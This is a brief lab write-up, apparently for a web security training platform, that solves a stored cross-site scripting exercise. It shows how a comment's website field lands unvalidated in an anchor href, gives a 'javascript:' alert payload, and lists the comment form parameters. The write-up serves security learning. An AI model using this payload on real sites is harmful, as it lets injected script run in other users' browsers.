### Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality.  
To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.

_____

Analysis and Exploit:

1. Post comment, website field "http://test"
```html
<p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">
        <a id="author" href="http://test">test</a> | 24 April 2023
</p>
<p>test</p>
```

2. There is no input constraint on the website field

3. Payload to post, then wait

```html
javascript:alert('XSS')
```


______

Script notes:

1. POST **/post/comment**
    - csrf
    - postId
    - comment
    - name
    - email
    - website